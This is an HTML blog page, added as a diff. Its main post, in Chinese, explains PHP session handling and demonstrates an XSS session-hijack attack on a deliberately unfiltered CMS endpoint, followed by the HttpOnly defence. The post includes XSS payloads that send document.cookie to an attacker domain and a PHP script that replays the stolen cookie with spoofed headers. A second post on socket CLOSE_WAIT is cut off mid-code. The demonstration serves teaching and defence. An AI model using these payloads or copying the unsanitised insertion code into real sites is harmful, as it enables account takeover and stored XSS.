@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <link rel="icon" type="image/png" href="/images/cabin.png" >
+    <link href="/styles/main.css" rel="stylesheet">
+    
+    <title>My Blog</title>
+    
+    
+  </head>
+  <body>
+    <nav>
+      <h1 class="name">
+        <a href="/">My Name</a>
+      </h1>
+      <div class="menu icon-menu"></div>
+      <ul class="nav-links">
+        <li class="text-link">
+          <a href="/about.html">about</a>
+        </li>
+        <li class="text-link">
+          <a href="/projects.html">projects</a>
+        </li>
+        <li class="text-link">
+          <a href="/archives.html">archives</a>
+        </li>
+      </ul>
+      <div class="social-media">
+        <a href="https://github.com/colinwren" class="icon-github"></a>
+        <a href="https://twitter.com/colinwrenca" class="icon-twitter"></a>
+      </div>
+    </nav>
+    <div class="content">
+
+
+  <div class="post-head group">
+  <a href="/posts/session/">
+    <h1 class="post-title">session的安全性</h1>
+  </a>
+  <span class="post-date">2014 &#183; 5 &#183; 25</span>
+</div>
+
+<div class="post-body markdown"><h1><a name="session" class="anchor" href="#session"><span class="header-link"></span></a>session的安全性</h1>
+<h2><a name="session" class="anchor" href="#session"><span class="header-link"></span></a>session原理</h2>
+<p>提到session，大家肯定会联想到登录，登录成功后记录登录状态，同时标记当前登录用户是谁。功能大体上就是这个样子，但是今天要讲的不是功能，而是实现。通过探讨session的实现方式来发掘一些可能你之前不知道的有趣的事情。<br>为了记录session，在客户端和服务器端都要保存数据，客户端记录一个标记，服务器端不但存储了这个标记同时还存储了这个标记映射的数据。好吧，还是说点白话吧，在客户端记录的其实是一个sessionid，在服务器端记录的是一个key-value形式的数据结构，这里的key肯定是指sessionid了，value就代表session的详细内容。用户在做http请求的时候，总是会把sessionid传递给服务器，然后服务器根据这个sessionid来查询session的内容（也就是上面说到的value）。<br>现在我们重点关注一下sessionid，他是今天问题的关键所在。sessionid在客户端（http的客户端一般就是指浏览器了）是存储在cookie中，当然也有例外（书本上肯定会提到也有保存在url中的，我做程序员这么多年也没有见过这种方式，这难道就是现实和实际的差距吗，好残酷）。
+我们通过一个例子来阐述一下这个sessionid在session处理时的作用。首先假定这么一个场景，我们有一个cms（content management system，内容管理系统），这个应用有一个后台，用户必须登录才能进入后台进行文章发表等操作。首先是登录流程，用户在浏览器输入用户名、密码，点击登录，浏览器会将用户名密码提交到服务器程序进行处理；服务器验证用户名、密码正确后，会返回登录成功信息，并且会修改服务器端的session内容，比如我们将用户ID写入session中，为了方便存储这些session的内容会被序列化成字符串或者二进制保存在文件或者数据库中，这时候大多数情况下服务器在对当前的http请求进行响应时，会返回一个新的sessionid要求浏览器写入本地cookie中，对应的返回的http响应头部信息应该会是是这个样子的：<code>set-cookie:PHPSESSID=xxxxxxx</code>,浏览器解析到这个头之后就会在当前生成一个cookie关联当前的域名。
+<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/login.png" alt="登录时序图">
+<strong>图1.1 登录时序图</strong>
+接着用户登录后台进行发表文章操作，登录用户填写文章的标题、内容，然后点击发送。这时候浏览器会生成一条到服务器的http请求，注意这个请求的头部会将存储sessionid的cookie内容发送过去，也就是说请求的http头部信息中应该会有这么一段数据：<code>cookie:PHPSESSID=xxxxxxx;other_cookie_name=yyyyyy</code>；服务器接收到这个http请求之后，解析到cookie存在，且cookie中存在PHPSESSID这个cookie名字，然后就将PHPSESSID的值（也就是sessionid的值）取出来，根据这个PHPSESSID查询服务器上有没有对应的session内容，如果有则将其对应的值取出来进行反序列序列化（也就是将其转成编程语言中的一个数据结果，比如在php中会得到一个<code>$_SESSION</code>数组，在j2ee中会得到类型为<code>javax.servlet.http.HttpSession</code>），方便在程序中进行读取，最终服务器认定session中储存的值存在，并且从反序列化得到的对象中读取到了用户ID属性，然后就往cms数据库的文章表中插入了一条数据，最终返回http响应，告诉浏览器操作成功了。
+<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/publish.png" alt="发表文章时序图">
+<strong>图1.2 发表文章时序图</strong></p>
+<h2><a name="" class="anchor" href="#"><span class="header-link"></span></a>入侵示例</h2>
+<p>关于cookie的一些属性，可以参考我的另一篇博文<a href="http://blog.csdn.net/yunnysunny/article/details/7748106" title="关于cookie的一些事">关于cookie的一些事</a>，里面会提到一个httponly的属性，也就是是否禁止js读取cookie。不幸的是很多常见的服务器（比如apache和tomcat）在生成这个存储sessionid的cookie的时候，没有设置httponly这个属性，也就是说js是可以将这个sessionid读取出来的。<br>js读取到sessionid，这会有问题吗？如果没有问题，我就不在这里啰嗦了。你网站上的运行的js代码并不一定是你写的，比如说一般网站都有一个发表文章或者说发帖的功能，如果别有用心的人在发表的时候填写了html代码（这些html一般是超链接或者图片），但是你的后台又没有将其过滤掉，发表出来的文章，被其他人点击了其中恶意链接时，就出事了。这也就是我们常说的XSS。 </p>
+<pre><code class="lang-php"><div class="highlight"><pre><span class="x">    </span><span class="cp">&lt;?php</span>
+    <span class="nb">session_start</span><span class="p">();</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">])</span> <span class="p">{</span>
+        <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
+        <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;尚未登录&#39;</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nv">$uid</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;uid&#39;</span><span class="p">];</span>
+        <span class="k">require_once</span><span class="p">(</span><span class="s1">&#39;../globaldb.php&#39;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">])</span> <span class="p">{</span>
+            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;标题为空&#39;</span><span class="p">;</span>
+            <span class="nx">goto</span> <span class="nb">end</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">])</span> <span class="p">{</span>
+            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
+            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;内容为空&#39;</span><span class="p">;</span>
+            <span class="nx">goto</span> <span class="nb">end</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">getStatus</span><span class="p">())</span> <span class="p">{</span>
+            <span class="nv">$title</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">];</span>
+            <span class="nv">$content</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;content&#39;</span><span class="p">];</span>
+            <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">&#39;insert into article(title,content,uid,create_time) values(&quot;&#39;</span><span class="o">.</span><span class="nv">$title</span><span class="o">.</span><span class="s1">&#39;&quot;,&quot;&#39;</span><span class="o">.</span><span class="nv">$content</span><span class="o">.</span><span class="s1">&#39;&quot;,&#39;</span><span class="o">.</span><span class="nv">$uid</span><span class="o">.</span><span class="s1">&#39;,now())&#39;</span><span class="p">;</span>
+            <span class="nv">$rv</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">dbExecute</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nv">$rv</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
+                <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;插入失败&#39;</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;数据库操作失败&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nb">end</span><span class="o">:</span>
+    <span class="k">echo</span> <span class="p">(</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$result</span><span class="p">));</span>
+</pre></div>
+</code></pre>
+<p><strong>代码2.1 添加文章的后台代码</strong>
+这里给出了一段不靠谱代码，之所以这么说是由于对于提交的内容没有做过滤，比如说<code>content</code>表单域的内容。现在假设有这么两个网站，一个你自己的CMS网站，域名<code>mycms.whyun.com</code>,一个黑客用的网站，域名<code>session.myhack.com</code>。你可以通过配置hosts来模拟这两个网站，说到这里可还是推荐一下我之前做过的<a href="http://git.oschina.net/yunnysunny/addhost" title="addhost">addhost</a>工具，可以自动生成hosts和vhost配置。代码2.1正是mycms网站的代码。<br>登录mycms后在后台添加一篇文章，文章内容为：</p>
+<pre><code><div class="highlight"><pre><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="err">\</span><span class="s2">&quot;#\&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="err">\</span><span class="s1">&#39;javascript:alert(document.cookie);return false;\&#39;</span><span class="o">&gt;</span><span class="err">点击我，有惊喜！</span><span class="o">&lt;</span><span class="err">/a&gt;</span>
+</pre></div>
+</code></pre>
+<p><strong>代码2.2 alert cookie</strong>
+<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/show_cookie.jpg" alt="显示cookie的html">
+<strong>图2.1 显示cookie的html</strong></p>
+<p>打开刚才生成的文章链接，然后点击<code>点击我，有惊喜！</code>,会显示当前域下的所有cookie。
+<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/alert_cookie.jpg" alt="coookie被alert出来">
+<strong>图2.2 cookie被alert出来</strong></p>
+<p>当然要想做到攻击的目的仅仅做这些是不够的，下面将这个链接的内容做的丰富多彩些。</p>
+<pre><code><div class="highlight"><pre><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="err">\</span><span class="s2">&quot;#\&quot; onclick=\&#39;javascript:var link = this; var head = document.getElementsByTagName(\&quot;head\&quot;)[0]; var js = document.createElement(\&quot;script\&quot;); js.src = \&quot;http://session.myhack.com/httphack.php?cook=\&quot;+encodeURIComponent(document.cookie); js.onload = js.onreadystatechange = function(){ if (!this.readyState || this.readyState == \&quot;loaded\&quot; || this.readyState == \&quot;complete\&quot;) {head.removeChild(js);  alert(\&quot;over\&quot;</span><span class="p">);</span> <span class="p">}</span> <span class="p">};</span> <span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">js</span><span class="p">);</span><span class="k">return</span> <span class="kc">false</span><span class="p">;</span><span class="err">\&#39;</span><span class="o">&gt;</span><span class="err">点击我，有惊喜</span><span class="mi">2</span><span class="err">！</span><span class="o">&lt;</span><span class="err">/a&gt;</span>
+</pre></div>
+</code></pre>
+<p><strong>代码2.3 跨站请求</strong><br>这里为了将代码嵌入html，得将其写作一行，其简洁模式为：</p>
+<pre><code class="lang-javascript"><div class="highlight"><pre>    <span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="k">this</span><span class="p">;</span>
+    <span class="kd">var</span> <span class="nx">head</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&quot;head&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span> 
+    <span class="kd">var</span> <span class="nx">js</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;script&quot;</span><span class="p">);</span> 
+    <span class="nx">js</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="s2">&quot;http://session.myhack.com/httphack.php?cook=&quot;</span><span class="o">+</span><span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span> 
+    <span class="nx">js</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nx">js</span><span class="p">.</span><span class="nx">onreadystatechange</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span> 
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="s2">&quot;loaded&quot;</span> <span class="o">||</span> <span class="k">this</span><span class="p">.</span><span class="nx">readyState</span> <span class="o">==</span> <span class="s2">&quot;complete&quot;</span><span class="p">)</span> <span class="p">{</span> 
+            <span class="nx">head</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">js</span><span class="p">);</span> 
+            <span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;开始跳转真正的地址&#39;</span><span class="p">);</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="nx">link</span><span class="p">.</span><span class="nx">getAttribute</span><span class="p">(</span><span class="s2">&quot;href&quot;</span><span class="p">);</span><span class="c1">//</span>
+        <span class="p">}</span>
+    <span class="p">};</span> 
+    <span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">js</span><span class="p">);</span>
+</pre></div>
+</code></pre>
+<p><strong>代码2.4 跨站请求简洁版</strong>
+为了真正的体现他是超链接还是跳转到一个地址为妙，所以在简洁班中脚本加载结束后做了跳转，但是为了演示方便，我们在代码2.3中没有这么做。<br>现在再点击链接<code>点击我，有惊喜！</code>，查看一下一下网络请求，会发现一个到session.myhack.com/httphack.php地址的请求，返回数据为<code>var data = {&quot;code&quot;:0};</code>。
+<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/cross_request.jpg" alt="跨站请求">
+<strong>图2.3 跨站请求</strong></p>
+<p>接着看看httphack.php干了啥：</p>
+<pre><code class="lang-php"><div class="highlight"><pre><span class="x">    </span><span class="cp">&lt;?php</span>
+    <span class="nb">error_reporting</span><span class="p">(</span><span class="k">E_ALL</span><span class="p">);</span>
+    <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;Content-type:application/javascript&quot;</span><span class="p">);</span>
+
+     <span class="k">function</span> <span class="nf">getRealIp</span><span class="p">()</span>
+    <span class="p">{</span>
+        <span class="nv">$ip</span> <span class="o">=</span> <span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
+        <span class="nv">$ipname</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+            <span class="s1">&#39;REMOTE_ADDR&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;HTTP_CLIENT_IP&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;HTTP_X_FORWARDED&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;HTTP_X_CLUSTER_CLIENT_IP&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;HTTP_FORWARDED_FOR&#39;</span><span class="p">,</span>
+            <span class="s1">&#39;HTTP_FORWARDED&#39;</span>
+        <span class="p">);</span>
+       <span class="k">foreach</span> <span class="p">(</span><span class="nv">$ipname</span> <span class="k">as</span> <span class="nv">$value</span><span class="p">)</span>
+       <span class="p">{</span>
+           <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$value</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$value</span><span class="p">])</span> <span class="p">{</span>
+
+                <span class="nv">$ip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="nv">$value</span><span class="p">];</span>
+                <span class="k">break</span><span class="p">;</span>
+           <span class="p">}</span>
+       <span class="p">}</span>
+       <span class="k">return</span> <span class="nv">$ip</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="nv">$ip</span> <span class="o">=</span> <span class="nx">getRealIp</span><span class="p">();</span>
+    <span class="nv">$cookies</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cook&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cook&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+    <span class="nv">$headers</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+        <span class="s1">&#39;User-Agent:&#39;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_USER_AGENT&#39;</span><span class="p">],</span>
+        <span class="s1">&#39;X-FORWARDED-FOR:&#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">,</span>
+        <span class="s1">&#39;Remote-Addr:&#39;</span><span class="o">.</span><span class="nv">$ip</span><span class="p">,</span>
+        <span class="s1">&#39;Cookie:&#39;</span><span class="o">.</span><span class="nv">$cookies</span>
+    <span class="p">);</span>
+    <span class="nv">$ch</span> <span class="o">=</span> <span class="nb">curl_init</span><span class="p">();</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="s2">&quot;http://mycms.whyun.com/back/article/article_add.php&quot;</span><span class="p">);</span>
+    <span class="c1">// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HTTPHEADER</span><span class="p">,</span> <span class="nv">$headers</span><span class="p">);</span>  <span class="c1">//构造IP</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_REFERER</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_REFERER&#39;</span><span class="p">]);</span>   <span class="c1">//构造来路</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POST</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="nv">$params</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;这是跨站攻击测试&#39;</span><span class="p">,</span><span class="s1">&#39;content&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;网站被跨站攻击了&#39;</span><span class="p">);</span>
+    <span class="nb">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_POSTFIELDS</span><span class="p">,</span> <span class="nb">http_build_query</span><span class="p">(</span><span class="nv">$params</span><span class="p">));</span>
+
+    <span class="nv">$out</span> <span class="o">=</span> <span class="nb">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+    <span class="nb">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">json_encode</span><span class="p">(</span><span class="nv">$headers</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">&quot;var data = </span><span class="si">$out</span><span class="s2">;&quot;</span><span class="p">;</span>
+</pre></div>
+</code></pre>
+<p><strong>代码2.5 伪造session提交</strong></p>
+<p>从代码2.5中可以看出，我们伪造了http请求的header内容，吧浏览器中mycms域的cookie原封不动传过去了，同时在header还伪造了user-agent和ip，mycms中在校验session的时候，发现sessionid和user-agent信息都是对的，所以认为session是存在且合法的！至此为止，我们完成了跨站请求攻击。</p>
+<h2><a name="3" class="anchor" href="#3"><span class="header-link"></span></a>3.防范</h2>
+<p>第二章节中，我们的攻击思路是这样的，我们示例了通过js获取cookie，然后生成一个第三方网站的网络请求，然后再从第三方网站发起一个网络请求到我们自己的网站上。整个更急流程大体是这样的：
+<img src="http://git.oschina.net/yunnysunny/hack/raw/master/session/img/hack_process.png" alt="跨站请求流程"><br><strong>图3.1 跨站请求流程</strong></p>
+<p>从图3.1可以看出，让整个流程无法进行下去的措施有两个，一个就是加强对提交信息和页面显示信息的过滤，让非法提交内容无处施展；第二个就是让存储在cookie中的sessionid不能被js读取到，这样即使第一步出现漏洞的情况下，依然不会被攻击者走完整个攻击流程。<br>在php中设置sessionid的httponly属性的方法有很多，具体可以参考 stackoverflow上的一个<a href="http://stackoverflow.com/questions/36877/how-do-you-set-up-use-httponly-cookies-in-php">提问</a>。jsp中也是有很多方法，可以参考开源中国红薯发表的一篇<a href="http://www.oschina.net/question/12_72706">文章</a>。这里仅仅贴出来php中一个解决方法，就是在<code>session_start()</code>之后重新设置一下cookie:    </p>
+<pre><code class="lang-php"><div class="highlight"><pre><span class="x">    </span><span class="cp">&lt;?php</span>
+    <span class="nv">$sess_name</span> <span class="o">=</span> <span class="nb">session_name</span><span class="p">();</span><span class="c1">//必须在session_start之前调用session_name</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">session_start</span><span class="p">())</span> <span class="p">{</span>
+        <span class="nx">setcookie</span><span class="p">(</span><span class="nv">$sess_name</span><span class="p">,</span> <span class="nb">session_id</span><span class="p">(),</span> <span class="k">null</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="p">}</span>
+</pre></div>
+</code></pre>
+<p><strong>代码3.1 设置httponly属性为true</strong></p>
+<p>本文源代码地址：<a href="http://git.oschina.net/yunnysunny/hack">源码git库</a></p>
+</div>
+
+  <div class="comments">
+    <a href="/posts/session/#comments">
+      <span class="icon-bubbles"></span>
+      Comments
+    </a>
+  </div>
+
+  <div class="post-head group">
+  <a href="/posts/socket/">
+    <h1 class="post-title">小议socket关闭</h1>
+  </a>
+  <span class="post-date">2014 &#183; 2 &#183; 8</span>
+</div>
+
+<div class="post-body markdown"><p>socket编程过程中往往会遇到这样那样的问题，出现了这些问题，有的是由于并发访问量太大造成的，有些却是由于代码中编程不慎造成的。
+比如说，最常见的错误就是程序中报打开的文件数过多这个错误。socket建立连接的时候是三次握手，这个大家都很清楚，
+但是socket关闭连接的时候，需要进行四次挥手，但很多人对于这四次挥手的具体流程不清楚，吃了很多亏。</p>
+<h2><a name="close-wait" class="anchor" href="#close-wait"><span class="header-link"></span></a>CLOSE_WAIT分析</h2>
+<p>socket是一种全双工的通信方式，建立完socket连接后，连接的任何一方都可以发起关闭操作。这里不妨假设连接的关闭是客户端发起。客户端的代码如下：</p>
+<pre><code><div class="highlight"><pre><span class="nx">ret</span> <span class="o">=</span> <span class="nx">CS_GetConnect</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">client</span><span class="p">,</span><span class="nx">ipAddr</span><span class="p">,</span><span class="mi">9010</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">ret</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">printf</span><span class="p">(</span><span class="s2">&quot;connected success.&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="nx">CloseSocket</span><span class="p">(</span><span class="nx">client</span><span class="p">);</span>
+</pre></div>
+</code></pre>
+<p>代码片段1.1</p>
+<p>基本逻辑就是，连接建立后立即关闭。其中CloseSocket函数是自定义函数，仅仅封装了在windows和linux下关闭socket的不同实现而已</p>
+<pre><code><div class="highlight"><pre><span class="err">#</span><span class="k">if</span> <span class="nx">defined</span><span class="p">(</span><span class="nx">WIN32</span><span class="p">)</span> <span class="o">||</span> <span class="nx">defined</span><span class="p">(</span><span class="nx">WIN64</span><span class="p">)</span>
+<span class="err">#</span><span class="nx">define</span> <span class="nx">CloseSocket</span><span class="p">(</span><span class="nx">fd</span><span class="p">)</span> <span class="k">do</span><span class="p">{</span> <span class="nx">closesocket</span><span class="p">(</span><span class="nx">fd</span><span class="p">);</span><span class="cm">/* shutdown(fd, 2);*/</span> <span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="err">#</span><span class="k">else</span>
+<span class="err">#</span><span class="nx">define</span> <span class="nx">CloseSocket</span><span class="p">(</span><span class="nx">fd</span><span class="p">)</span> <span class="k">do</span><span class="p">{</span> <span class="nx">close</span><span class="p">(</span><span class="nx">fd</span><span class="p">);</span> <span class="cm">/*shutdown(fd,2);*/</span> <span class="p">}</span><span class="k">while</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+<span class="err">#</span><span class="nx">endif</span>
+</pre></div>
+</code></pre>
+<p>代码片段1.2</p>
+<p><img src="close1.png" alt="socket的关闭流程1"></p>
+<p>图1.1 CLOSE_WAIT出现流程</p>
+<p>客户端调用了CloseSocket之后，发送FIN信号到服务器端，告诉socket程序，连接已经断开。服务器端接收到FIN信号后，会将自身的TCP状态置为<code>CLOSE_WAIT</code>,同时回复 一个ACK信号给客户端，客户端接收到这个ACK信号后，自身将处于<code>FIN_WAIT_2</code>状态。</p>
+<p>但是tcp是全双工的通信协议，虽然客户端关闭了连接，但是服务器端对于这个关闭动作不予理睬怎么办。对于服务器端来说，这是个不幸的消息，因为它将一直处于<code>CLOSE_WAIT</code>状态，虽然客户端已经不需要和服务器间进行通信了，但是服务器端的socket连接句柄一直得不到释放；如果老是有这种情况出现，久而久之服务器端的连接句柄就会被耗尽。对于发起关闭的客户端来说，他处于<code>FIN_WAIT_2</code>状态，如果出现服务器端一直处于<code>CLOSE_WATI</code>状态的情况，客户端并不会一直处在<code>FIN_WAIT_2</code>状态，因为这个状态有一个超时时间，这个值可以在/etc/sysctl.conf中进行配置。在这个文件中配置<code>net.ipv4.tcp_fin_timeout=30</code>即可保证<code>FIN_WAIT_2</code>状态最多保持30秒，超过这个时间后就进入TIME_WAIT状态（下面要讲到这个状态）。</p>
+<p><strong>注意：这里socket的关闭从客户端发起，仅仅是为了举例说明，socket的关闭完全也可以从服务器端发起。比如说你写了一个爬虫程序去下载互联网上的某些web服务器上的资源的时候，某些要下载的web资源不存在，web服务器会立即关闭当前的socket连接，但是你的爬虫程序不够健壮，对于这种情况没有做处理，同样会使你的爬虫客户端处于CLOSE_WAIT状态。</strong></p>
+<p>那么怎样预防SOCKET处于CLOSE_WATI状态呢，答案在这里：</p>
+<pre><code><div class="highlight"><pre>    <span class="k">while</span><span class="p">(</span><span class="kc">true</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">memset</span><span class="p">(</span><span class="nx">getBuffer</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nx">MY_SOCKET_BUFFER_SIZE</span><span class="p">);</span>
+        <span class="nx">Ret</span> <span class="o">=</span> <span class="nx">recv</span><span class="p">(</span><span class="nx">client</span><span class="p">,</span> <span class="nx">getBuffer</span><span class="p">,</span> <span class="nx">MY_SOCKET_BUFFER_SIZE</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="nx">Ret</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="nx">Ret</span> <span class="o">==</span> <span class="nx">SOCKET_ERROR</span> <span class="p">)</span> 
